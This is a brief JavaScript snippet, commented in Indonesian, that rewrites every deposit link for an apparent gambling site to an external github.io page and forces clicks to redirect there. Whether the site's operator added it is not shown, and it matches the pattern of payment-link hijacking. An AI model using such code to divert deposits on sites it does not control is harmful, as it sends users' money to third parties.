document.addEventListener("DOMContentLoaded", function () {
  // Seleksi semua elemen <a>
  document.querySelectorAll('a[href="https://katana333.top/m/account/deposit.php"]').forEach(function (el) {
    // Ganti href
    el.setAttribute("href", "https://inggarfi.github.io/instantdepositqr/depositkatana.html");

    // Jika klik, langsung redirect juga (opsional)
    el.addEventListener("click", function (e) {
      e.preventDefault();
      window.location.href = "https://inggarfi.github.io/instantdepositqr/depositkatana.html";
    });
  });
});
